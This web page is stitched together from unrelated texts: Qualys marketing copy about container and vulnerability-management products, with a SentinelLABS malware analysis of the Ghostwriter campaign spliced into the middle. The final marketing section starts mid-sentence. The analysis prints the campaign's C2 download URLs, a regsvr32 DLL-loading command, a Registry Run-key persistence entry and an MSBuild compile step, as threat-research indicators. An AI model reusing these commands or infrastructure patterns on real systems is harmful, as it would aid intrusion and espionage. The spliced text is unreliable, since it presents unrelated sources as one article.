&lt;h2 class="wp-block-heading" id="the-evolution-of-vulnerability-management-context-clarity-confidence"&gt;&lt;strong&gt;The Evolution of Vulnerability Management: Context, Clarity, Confidence&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Today, &lt;a href="https://www.qualys.com/apps/container-security/"&gt;vulnerability management&lt;/a&gt; is more than just identifying security gaps—it’s about precise, real-time risk assessment with minimal noise. Security teams struggle with overwhelming alerts, false positives, and incomplete data, making it difficult to focus on real threats.&lt;/p&gt;



&lt;p&gt;Unlike traditional scanners that often rely on assumptions, incomplete data, or generic CVE feeds, Qualys TotalCloud KCS takes a fundamentally different approach. Our scanning methodology integrates official insights from Red Hat’s Product Security Team with our 25+ security intelligence feeds, ensuring:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Combined Context and Correlation From Red Hat&lt;/strong&gt;: By integrating Red Hat’s official security intelligence with Qualys’ 25+ security feeds, we provide richer vulnerability context and deeper correlation. This ensures that security teams get the most relevant and actionable insights—mapping vulnerabilities across Red Hat containers, images, and workloads with enriched intelligence from multiple sources.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Zero Noise, No Guesswork&lt;/strong&gt;: Qualys TotalCloud KCS eliminates unnecessary noise by leveraging Red Hat’s authoritative security intelligence. If Red Hat determines a vulnerability does not affect an asset, TotalCloud KCS suppresses it from reports. Related CVEs are consolidated into a single detection, reducing alert fatigue and making remediation efforts more focused.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Instant, Verified Patch Guidance&lt;/strong&gt;: When a fix is available, Qualys TotalCloud KCS directly links to Red Hat-approved patches, streamlining remediation and reducing the time to resolution.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Automated Risk Propagation&lt;/strong&gt;: Vulnerabilities detected in &lt;strong&gt;Quay.io registries&lt;/strong&gt; automatically propagate to running containers, ensuring real-time risk visibility and proactive security measures.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;By taking this approach, Qualys TotalCloud KCS not only enhances detection accuracy but also simplifies security operations, helping enterprises maintain compliance and reduce risk with confidence.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SentinelLABS has observed a campaign targeting opposition activists in Belarus as well as Ukrainian military and government organizations.&lt;/li&gt;
&lt;li&gt;The campaign has been in preparation since July-August 2024 and entered the active phase in November-December 2024.&lt;/li&gt;
&lt;li&gt;Recent malware samples and command-and-control (C2) infrastructure activity indicate that the operation remains active in recent days.&lt;/li&gt;
&lt;li&gt;SentinelLABS assesses that this cluster of threat activity is an extension of the long-running Ghostwriter campaign identified in previous public reporting.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Ghostwriter | Background&lt;/h2&gt;
&lt;p&gt;Ghostwriter is a long-running campaign likely active since 2016 and subsequently described in various public reports throughout 2020 to 2024. The actor behind Ghostwriter campaigns is closely linked with Belarusian government espionage efforts, while most commonly reported under the APT names &lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/unc1151-linked-to-belarus-government/" rel="noopener noreferrer" target="_blank"&gt;UNC1151&lt;/a&gt; (Mandiant) or &lt;a href="https://cert.gov.ua/search/UAC-0057" rel="noopener noreferrer" target="_blank"&gt;UAC-0057&lt;/a&gt; (CERT-UA). Some public reports may use the term &amp;#8220;Ghostwriter APT&amp;#8221; interchangeably to refer to both the threat actor and its associated campaigns.&lt;/p&gt;
&lt;p&gt;Previous &lt;a href="https://www.cardiff.ac.uk/__data/assets/pdf_file/0005/2699483/Ghostwriter-Report-Final.pdf" rel="noopener noreferrer" target="_blank"&gt;research&lt;/a&gt; on the evolution of Ghostwriter noted how it operated successfully across a range of platforms, blending information manipulation with hacking to target a number of European countries. Reporting throughout 2022 to 2024 described &lt;a href="https://cert.gov.ua/article/6280159" rel="noopener noreferrer" target="_blank"&gt;activity&lt;/a&gt; in which malicious Excel documents were used to deliver PicassoLoader and Cobalt Strike payloads. Observed document lures were themed around issues pertaining to the Ukraine military and the &lt;a href="https://cyble.com/blog/unc1151-strikes-again-unveiling-their-tactics-against-ukraines-ministry-of-defence/" rel="noopener noreferrer" target="_blank"&gt;likely targeting&lt;/a&gt; of the Ministry of Defense.&lt;/p&gt;
&lt;p&gt;SentinelLABS has observed new activity with multiple weaponized Excel documents containing lures pertaining to the interests of the Ukraine government, the Ukraine military and domestic Belarusian opposition. While some of the TTPs we have observed overlap with previous reporting, others are new, including adaptations of previously observed payloads such as PicassoLoader.&lt;/p&gt;
&lt;h2&gt;Weaponized XLS 1 | &amp;#8220;Political Prisoners in Minsk Courts&amp;#8221;&lt;/h2&gt;
&lt;p&gt;SentinelLABS analyzed an attack that started with a Google Drive shared document landing in the target’s inbox. The email originated from an account using the name “Vladimir Nikiforech” (&lt;code&gt;vladimir.nikiforeach@gmail[.]com&lt;/code&gt;). The email link pointed to a downloadable RAR archive, which according to the internal timestamps was created on 2025-01-14 00:47:54, containing a malicious Excel workbook (&lt;code&gt;ebb30fd99c2e6cbae392c337df5876759e53730d&lt;/code&gt;) with the file name &lt;code&gt;политзаключенные(по судам минска).xls&lt;/code&gt; (“Political prisoners (across courts of Minsk).xls”).&lt;/p&gt;
&lt;p&gt;The title of the lure indicates an interesting shift in Ghostwriter targeting. Although attribution for the 2021 Ghostwriter campaign &lt;a href="https://www.cardiff.ac.uk/__data/assets/pdf_file/0005/2699483/Ghostwriter-Report-Final.pdf" rel="noopener noreferrer" target="_blank"&gt;pointed to&lt;/a&gt; the Belarus state, this is the first time we have seen lures directly aimed at Belarus government opposition. The timing of the attack could have been motivated by the presidential election that &lt;a href="https://en.wikipedia.org/wiki/2025_Belarusian_presidential_election" rel="noopener noreferrer" target="_blank"&gt;took place&lt;/a&gt; shortly after on Jan 26, 2025.&lt;/p&gt;
&lt;p&gt;The XLS document contains an obfuscated VBA macro which is activated when the document is opened and the user allows Office macros to run.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114850" style="width: 1837px;"&gt;&lt;img alt="Obfuscated macro inside the XLS spreadsheet" class="size-full wp-image-114850" height="752" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3.jpg" width="1837" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114850"&gt;Obfuscated macro inside the XLS spreadsheet&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;On execution, the macro writes a file to &lt;code&gt;%Temp%\Realtek(r)Audio.dll&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The DLL file is loaded with the following command line invocation:&lt;/p&gt;
&lt;pre&gt;
C:\Windows\System32\regsvr32.exe /u /s "C:\Temp\Realtek(r)Audio.dll”
&lt;/pre&gt;
&lt;p&gt;This starts the standard Windows process &lt;code&gt;regsvr32.exe&lt;/code&gt;, which calls the &lt;code&gt;DllUnregisterServer&lt;/code&gt; function implemented inside the DLL; the function then loads and executes the .NET assembly described next.&lt;/p&gt;
&lt;p&gt;Analysis of &lt;code&gt;Dwnldr.dll&lt;/code&gt; shows that it is a DLL file with a .NET assembly embedded inside. The file is protected with &lt;a href="https://mkaring.github.io/ConfuserEx/" rel="noopener noreferrer" target="_blank"&gt;ConfuserEx&lt;/a&gt; &amp;#8211; a publicly available tool that helps to obfuscate .NET programs and observed in previous Ghostwriter campaigns.&lt;/p&gt;
&lt;p&gt;The DLL file hosts a payload that appears to be a simplified variant of PicassoDownloader, a malware family also linked to Ghostwriter activity. The internal filename (&lt;code&gt;Dwnldr.dll&lt;/code&gt;) was previously used by the Ghostwriter threat actor; however, this variant bears only high-level similarities to previous versions, with significant changes to the underlying code, possibly to make it a cheaper and more expendable tool.&lt;/p&gt;
&lt;p&gt;As a part of application protection provided by the obfuscator, the Downloader creates a copy of itself in memory, and then modifies it. It does so by decrypting additional code of the assembly. It also uses a clever evasion technique, altering its own PE header in memory and breaking internal links to the .NET assembly. This makes it impossible for security products to parse it as a .NET module.&lt;/p&gt;
&lt;p&gt;During code execution, after the protection layer passes control to core functionality, the Downloader writes a decoy Excel workbook file to &lt;code&gt;%AppData%\Roaming\Microsoft\temp.xlsx&lt;/code&gt; and downloads additional file(s) from the Web.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;temp.xlsx&lt;/code&gt; decoy file (&lt;code&gt;18151b3801bd716b5a33cfc85dbdc4ba84a00314&lt;/code&gt;) is immediately opened in Excel in an attempt to make the victim believe that it contains the original content of the &lt;code&gt;политзаключенные (по судам минска).xls&lt;/code&gt; file.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114854" style="width: 1999px;"&gt;&lt;img alt="Decoy document containing lists of people with criminal charges, prosecutors’ and judges’ names" class="size-full wp-image-114854" height="803" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114854"&gt;Decoy document containing lists of people with criminal charges, prosecutors’ and judges’ names&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The spreadsheet contains the names of people with criminal charges along with the names of prosecutors and judges: content that invites the reader to believe it could be leaked from a government source. However, the information was already in the public domain and can be found on the website of a proscribed Belarusian human rights organization, &lt;a href="https://prisoners.spring96.org/ru/list" rel="noopener noreferrer" target="_blank"&gt;Spring96&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Once the decoy Excel file is opened, the Downloader attempts to fetch the next stage from the following URL:&lt;/p&gt;
&lt;pre&gt;
https://everythingandthedog[.]shop/petsblog/2020/2/25/tips-for-taking-difficult-dogs-on-a-walk.jpg
&lt;/pre&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114852" style="width: 720px;"&gt;&lt;img alt="The JPG image file fetched from the C2" class="size-full wp-image-114852" height="960" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_13.jpg" width="720" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114852"&gt;The JPG image file fetched from the C2&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;We note that the &lt;code&gt;.shop&lt;/code&gt; top level domain was also reported in other Ghostwriter activity seen in 2024.&lt;/p&gt;
&lt;p&gt;When the malware issues the HTTP request, it uses a hardcoded User-Agent string:&lt;/p&gt;
&lt;pre&gt;
Mozilla/5.0 (&lt;b&gt;Macintosh; Intel Mac OS X 10_15_7&lt;/b&gt;) AppleWebKit/555.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
&lt;/pre&gt;
&lt;p&gt;The fetched file (&lt;code&gt;8d2bb96e69df059f279d97989690ce3e556a8318&lt;/code&gt;) is a benign JPEG file, originating from publicly available photo stock, with no extra payload or any hidden cave where code could be embedded. We confirmed that an identical file can be found online, located on a web site that is nearly identical to the one used by attackers. It would seem the attackers not only reused the JPG file contents from a legitimate website but also copied its original URL, changing only the top level domain:&lt;/p&gt;
&lt;pre&gt;
https://www.everythingandthedog&lt;b&gt;.com&lt;/b&gt;/petsblog/2020/2/25/tips-for-taking-difficult-dogs-on-a-walk.
&lt;/pre&gt;
&lt;p&gt;Once the file is downloaded, it is renamed and then saved to &lt;code&gt;%APPDATA%\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Later, it is registered to load during autostart by leveraging the Registry Run key:&lt;/p&gt;
&lt;pre&gt;
HKCU\System\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Certificate Center
&lt;/pre&gt;
&lt;p&gt;with its value pointing to expanded environment variable string:&lt;/p&gt;
&lt;pre&gt;
rundll32.exe C:\Users\\AppData\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll,#1
&lt;/pre&gt;
&lt;p&gt;This Registry entry makes &lt;code&gt;rundll32.exe&lt;/code&gt; load the DLL and execute its exported function with ordinal 1 whenever a user logs on.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114847" style="width: 1999px;"&gt;&lt;img alt="Overview of the malware stages for Weaponized XLS 1" class="size-full wp-image-114847" height="1180" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_6.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114847"&gt;Overview of the malware stages for Weaponized XLS 1&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;During our analysis we only observed the benign JPG file being downloaded. However, based on the code analysis, we believe that the real targets receive an actual DLL. We assume that such a targeted payload delivery process is carefully controlled by the attackers and that they deliver the payload only after confirming the requesting client&amp;#8217;s profile (browser user agent, IP address of the client, and matching time of the operation window). &lt;a href="https://www.fortinet.com/blog/threat-research/menace-unleashed-excel-file-deploys-cobalt-strike-at-ukraine" rel="noopener noreferrer" target="_blank"&gt;Research&lt;/a&gt; in a previous campaign found that a Cobalt Strike payload was delivered to targets only if the host IP was located in Ukraine.&lt;/p&gt;
&lt;p&gt;Given the timing and targeting of the attack, we hypothesized that it may not have been an isolated incident. Further research led us to discover other samples closely resembling Weaponized XLS 1, suggesting that multiple attacks using the same techniques had been planned or executed. The samples used in these suspected attacks are described below.&lt;/p&gt;
&lt;h2&gt;Weaponized XLS 2 | Ukraine Gov “Anti-Corruption Initiative”&lt;/h2&gt;
&lt;p&gt;A file bearing the Ukrainian name &lt;code&gt;Zrazok.xls&lt;/code&gt; (“Sample.xls”) is an XLS file (&lt;code&gt;301ffdf0c7b67e01fd2119c321e7ae09b7835afc&lt;/code&gt;) with an obfuscated VBA macro embedded. However, the script code and obfuscation technique are different from the case we discussed earlier.&lt;/p&gt;
&lt;p&gt;For this script, the attackers used a popular obfuscator tool called &lt;a href="https://github.com/sevagas/macro_pack" rel="noopener noreferrer" target="_blank"&gt;Macropack&lt;/a&gt;, an open-source but seemingly abandoned project originally developed for red-teaming and penetration testing exercises.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114845" style="width: 1837px;"&gt;&lt;img alt="Macropack-obfuscated VBA macro found inside the spreadsheet" class="size-full wp-image-114845" height="752" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8.jpg" width="1837" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114845"&gt;Macropack-obfuscated VBA macro found inside the spreadsheet&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;As in the previous case, once the macro code is executed, the .NET ConfuserEx-obfuscated Downloader DLL (written to &lt;code&gt;%AppData%\Roaming\Microsoft\bruhdll32.dll&lt;/code&gt;) is loaded with &lt;code&gt;rundll32.exe&lt;/code&gt; and respective commandline arguments to run an exported function. After this, the new module drops a decoy XLS file and opens it with Excel.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114851" style="width: 1790px;"&gt;&lt;img alt="The decoy document prepared for a Ukrainian reader (an action plan for anti-corruption initiative in government organisations in Ukraine)" class="size-full wp-image-114851" height="1255" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_2.jpg" width="1790" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114851"&gt;The decoy document prepared for a Ukrainian reader (an action plan for anti-corruption initiative in government organisations in Ukraine)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;This module attempts to download the next stage from the following URL (unavailable at the time of writing):&lt;/p&gt;
&lt;pre&gt;
https://sciencealert[.]shop/images/2024/11/black-hole-coronaxx.jpg
&lt;/pre&gt;
&lt;p&gt;When the malware issues the HTTP request it uses a hardcoded User-Agent string that differs slightly from the previous case:&lt;/p&gt;
&lt;pre&gt;
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
&lt;/pre&gt;
&lt;p&gt;Notably, this file (&lt;code&gt;52e894acf0e14d27f8997d2174c1f40d6d87bba9&lt;/code&gt;) was previously uploaded to &lt;a href="https://www.virustotal.com/gui/file/4497bb70ca95b115d7be403141e34f7fb06070b8dd6ccf034d9a71c1c48826e4/details" rel="noopener noreferrer" target="_blank"&gt;VirusTotal&lt;/a&gt; on December 19, 2024.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114846" style="width: 1024px;"&gt;&lt;img alt="Image file fetched from the malicious URL" class="size-full wp-image-114846" height="415" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_7.jpg" width="1024" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114846"&gt;Image file fetched from the malicious URL&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;As with the previous case, the image file and its URL path appear to be copied from a public blog, published on Nov 16, 2024:&lt;/p&gt;
&lt;pre&gt;
https://www.sciencealert.com/scientists-reveal-the-shape-of-a-black-holes-corona-for-the-very-first-time
&lt;/pre&gt;
&lt;p&gt;Again, the file name and the path on the malicious server were nearly identical to the legitimate one, with the actor changing only the top level domain from &lt;code&gt;.com&lt;/code&gt; to &lt;code&gt;.shop&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;
https://www.sciencealert.com/images/2024/11/black-hole-coronaxx.jpg
&lt;/pre&gt;
&lt;p&gt;In this case, the downloaded file is expected to be an archive in a GZIP format. Once downloaded, the malware decompresses it and saves it to the following location:&lt;/p&gt;
&lt;pre&gt;
%APPDATA%\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll
&lt;/pre&gt;
&lt;p&gt;It also creates an additional text config file at:&lt;/p&gt;
&lt;pre&gt;
%APPDATA%\Roaming\Microsoft\SystemCertificates\config
&lt;/pre&gt;
&lt;p&gt;The config file contains the following data:&lt;/p&gt;
&lt;pre&gt;

 &amp;lt;/Target&amp;gt;
&amp;lt;/Project&amp;gt;
&lt;/pre&gt;
&lt;p&gt;The config file is used by the Downloader to execute &lt;code&gt;MSBuild.exe&lt;/code&gt;, instructing it to build a new application:&lt;/p&gt;
&lt;pre&gt;
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe %AppData%\Roaming\Microsoft\SystemCertificates\config
&lt;/pre&gt;
&lt;p&gt;This suggests that the &lt;code&gt;CertificateCenter.dll&lt;/code&gt; file is not a binary as the file extension would suggest but rather contains program source code. The command, if successful, produces an executable file in the following location:&lt;/p&gt;
&lt;pre&gt;
%AppData%\Roaming\Microsoft\SystemCertificates\Bin\Certificate.exe
&lt;/pre&gt;
&lt;p&gt;and likely contains the next stage of the infection chain.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114848" style="width: 1999px;"&gt;&lt;img alt="Overview of the malware stages for Weaponized XLS 2" class="size-full wp-image-114848" height="1621" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_5.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114848"&gt;Overview of the malware stages for Weaponized XLS 2&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Weaponized XLS 3 | &amp;#8220;Supplies for Ukraine Armed Forces&amp;#8221;&lt;/h2&gt;
&lt;p&gt;A file bearing the Ukrainian name &lt;code&gt;Донесення 5 реч - зразок.xls&lt;/code&gt; (“Report 5 items &amp;#8211; sample.xls”) is an XLS file (&lt;code&gt;9d110879d101bcaec7accc3001295a53dc33371f&lt;/code&gt;) hosting another VBA payload obfuscated with Macropack.&lt;/p&gt;
&lt;p&gt;As in the previous cases, once the macro code is executed, the .NET ConfuserEx-obfuscated Downloader DLL (written to &lt;code&gt;%AppData%\Roaming\Microsoft\bruhdll32.dll&lt;/code&gt;) is loaded with &lt;code&gt;rundll32.exe&lt;/code&gt; and respective commandline arguments to run an exported function. After this, the new module drops a decoy XLS file on disk and opens it with Excel.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114849" style="width: 1989px;"&gt;&lt;img alt="The decoy document prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)" class="size-full wp-image-114849" height="1256" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_4.jpg" width="1989" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114849"&gt;The decoy document prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Again, the malware uses the same payload retrieval technique and downloads a JPG file from yet another &lt;code&gt;.shop&lt;/code&gt; domain:&lt;/p&gt;
&lt;pre&gt;
https://cookingwithbooks[.]shop/images/qwerty.jpg
&lt;/pre&gt;
&lt;p&gt;The URL is unavailable at the time of writing, but data from VirusTotal indicates that the downloaded file is identical to the black hole image described above in the Weaponized XLS 2 section. The malware logic is also identical with Weaponized XLS 2.&lt;/p&gt;
&lt;h2&gt;Weaponized XLS 4 &amp;amp; 5 | Variations on a Theme&lt;/h2&gt;
&lt;p&gt;In addition to the previous findings, we discovered further related XLS files that were similarly weaponized. The files &lt;code&gt;Донесення 5 реч фонд зборів- зразок.xls&lt;/code&gt; (“Report 5 items collection fund- sample.xls”; &lt;code&gt;2c06c01f9261fe80b627695a0ed746aa8f1f3744&lt;/code&gt;) and &lt;code&gt;Додаток 8 реч новий.xls&lt;/code&gt; (“Addition 8 items new &amp;#8211; sample.xls”; &lt;code&gt;853da593d2a489c2bd72a284a362d7c68c3a4d4c&lt;/code&gt;) were first uploaded from Ukraine in Feb 2025.&lt;/p&gt;
&lt;p&gt;Both files contain a Macropack-obfuscated VBA macro; however, they differ in structure. Functionally, both drop a DLL to the previously noted path &lt;code&gt;%AppData%\Roaming\Microsoft\bruhdll32.dll&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Again, the DLL is loaded with &lt;code&gt;rundll32.exe&lt;/code&gt; and respective command line arguments to execute an exported function. Next, the victim sees a decoy workbook open in Excel.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter size-full wp-image-114853" height="1138" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_12.jpg" width="1816" /&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114855" style="width: 1868px;"&gt;&lt;img alt="The decoy documents prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)" class="size-full wp-image-114855" height="1142" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_10.jpg" width="1868" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114855"&gt;The decoy documents prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The decoys are similar and the obfuscation technique, code structure, and the embedded URL are common to both:&lt;/p&gt;
&lt;pre&gt;
https://pigglywigglystores[.]shop/wp-content/themes/fp-wp-j-piggly-wiggly-nc/resources/images/logo/logo.png
&lt;/pre&gt;
&lt;p&gt;The User-Agent string in the HTTP request, however, is different, with the operating system and architectures specified as “Windows NT 10.0; Win64; x64”.&lt;/p&gt;
&lt;pre&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71
&lt;/pre&gt;
&lt;p&gt;These variants of the malware also contain another embedded .NET DLL, internally referred to as LibCMD from the original filename &lt;code&gt;LibCMD.dll&lt;/code&gt; (&lt;code&gt;4ae6b8adc980ba8a212b838f3ca6a9718d9a3757&lt;/code&gt;). This is a small file, whose purpose is simply to start &lt;code&gt;cmd.exe&lt;/code&gt; and connect to stdin/stdout.&lt;/p&gt;
&lt;p&gt;The file contains a tampered PE link timestamp. It is never saved to disk; instead, it is loaded dynamically in memory as a .NET assembly and executed.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114844" style="width: 1999px;"&gt;&lt;img alt="Overview of the malware stages for Weaponized XLS 4 &amp;amp; 5" class="size-full wp-image-114844" height="1621" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_9.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114844"&gt;Overview of the malware stages for Weaponized XLS 4 &amp;amp; 5&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Attribution&lt;/h2&gt;
&lt;p&gt;Analysis of techniques used by threat actors can often be helpful in establishing the origin of the attack and the malware it uses. In this case, the obfuscation techniques are quite specific across all the samples we analyzed, allowing us to establish a medium confidence link between them and a malware cluster known as PicassoLoader, a downloader toolkit.&lt;/p&gt;
&lt;p&gt;PicassoLoader has been used in cyber attacks targeting government, military, and civilian entities in Ukraine and Poland and is exclusively associated with the Ghostwriter threat actor (&lt;i&gt;aka&lt;/i&gt; UNC1151, UAC-0057, Blue Dev 4, Moonscape, TA445).&lt;/p&gt;
&lt;p&gt;Throughout 2024, Ghostwriter has repeatedly used a combination of Excel workbooks containing Macropack-obfuscated VBA macros and dropped embedded .NET downloaders obfuscated with ConfuserEx. In our case, the Downloader malware appears to be a simplified implementation of the PicassoLoader.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;The Ghostwriter threat actor has been consistently active in the past years and continues its attempts to compromise targets aligned with the interests of Belarus and its closest ally, Russia. It has mounted multiple attacks reported by CERT UA and other security researchers throughout 2024.&lt;/p&gt;
&lt;p&gt;While Belarus doesn’t actively participate in military campaigns in the war in Ukraine, cyber threat actors associated with it appear to have no reservation about conducting cyberespionage operations against Ukrainian targets.&lt;/p&gt;
&lt;p&gt;The campaign described in this publication also serves as confirmation that Ghostwriter is closely tied with the interests of the Belarusian government waging an aggressive pursuit of its opposition and organizations associated with it.&lt;/p&gt;

Note the emphasis on criticality and on the outcome: managing risk. &lt;a href="https://www.forrester.com/blogs/announcing-the-vulnerability-risk-management-landscape-q2-2023-report/"&gt;The 2023 Forrester Vulnerability Risk Management Landscape report&lt;/a&gt; rightly adds that VM solutions facilitate prioritization and remediation workflows.&lt;/p&gt;



&lt;p&gt;One word you don’t see: scanning. There’s no doubt that the strength, accuracy, and versatility of your vulnerability scanning are the backbone of your program, but vulnerability management is about &lt;em&gt;an outcome&lt;/em&gt; that goes beyond a list of detections. It’s about prioritizing and removing the most critical risk from your environment.&lt;/p&gt;



&lt;p&gt;Since 2019, &lt;a href="https://www.qualys.com/apps/vulnerability-management-detection-response/"&gt;Qualys VMDR&lt;/a&gt; has been helping customers do just that with the leading risk-based vulnerability management solution in the market. For any Qualys customer still using traditional VM or not leveraging VMDR in its full capacity, this blog post will help identify potential gaps in your program to deliver maximum visibility, leading prioritization, and faster remediation of critical business risk.&lt;/p&gt;



&lt;span id="more-37269"&gt;&lt;/span&gt;



&lt;h2 class="wp-block-heading" id="vmdr-more-than-just-a-license-to-scan"&gt;VMDR: More Than Just a “License to Scan”&lt;/h2&gt;



&lt;p&gt;With the stakes higher than ever, security teams must ask these questions of their VM program:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;With today’s dynamic attack surface (IT/OT/IoT, cloud and container assets, open-source software, web apps, and APIs, AI models, etc.), how do you know your VM scans cover everything?&lt;/li&gt;



&lt;li&gt;How can you trust that your prioritization engine combines threat intel with unique business context to identify what matters most?&lt;/li&gt;



&lt;li&gt;How do you remove the invisible fence between security and IT to ensure critical risk is removed as quickly as possible?&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;a href="https://www.qualys.com/forms/whitepapers/gigaom-radar-for-continuous-vulnerability-management/"&gt;Qualys VMDR has been recognized&lt;/a&gt; as the only “Leader” and “Outperformer” in the market for helping customers answer these questions. It goes beyond traditional tools by combining asset discovery, vulnerability prioritization, certificate lifecycle management, compliance benchmarking, and real-time threat intelligence in one solution. Qualys has empowered organizations to shift from reactive security to proactive risk reduction. This comprehensive approach enables organizations to prioritize risks effectively, providing a clearer view of cyber threats and their potential impact. Additionally, with access to unlimited scanner appliances and a standard API for seamless integrations, organizations can scale their vulnerability management efforts without additional complexity. Our response capabilities enable organizations to remediate risks up to 50% faster, driving significant improvements in security posture. Many VM customers have recognized this advantage early and upgraded to VMDR to strengthen their security programs.&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="risk-detection-scoring-and-prioritization"&gt;Risk Detection, Scoring and Prioritization&lt;/h2&gt;



&lt;h4 class="wp-block-heading"&gt;&lt;strong&gt;Vulnerability Management&lt;/strong&gt; &lt;strong&gt;– Identify Risks on Digital Assets&lt;/strong&gt;&lt;/h4&gt;



&lt;p&gt;Discover and identify critical vulnerabilities with an extensive knowledgebase that supports over 85K CVEs, and reduce cybersecurity risk in real-time risk discovery across your internal, external, and public cloud IT domain.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://docs.qualys.com/en/vmdr/getting-started-guide/vmdr/getting_started_guide.htm"&gt;Qualys VMDR Getting Started Guide&lt;/a&gt;&lt;/p&gt;



&lt;h4 class="wp-block-heading"&gt;&lt;strong&gt;TruRisk – Measure Risk in Real Time&lt;/strong&gt;&lt;/h4&gt;



&lt;p&gt;While the number of vulnerabilities continues to rise, the resources available to identify and remediate them often remain limited. This challenge calls for a risk-based approach to vulnerability management that emphasizes returning to the basics. With TruRisk, we quantify the risk associated with all digital assets and attack surfaces, empowering organizations to prioritize and measure the material impact of vulnerabilities more effectively.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/hd_vm-vmdr_blog_trurisk.png"&gt;&lt;img alt="" class="wp-image-37296" height="1118" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/hd_vm-vmdr_blog_trurisk.png" width="3048" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Using CVSS or EPSS to measure the likelihood of vulnerability exploitation lacks business context and up-to-date threat intelligence. Our vulnerability-level scoring incorporates threat intelligence from over 25 sources, recalculated daily, to provide a more accurate view of exploit likelihood.&lt;/p&gt;



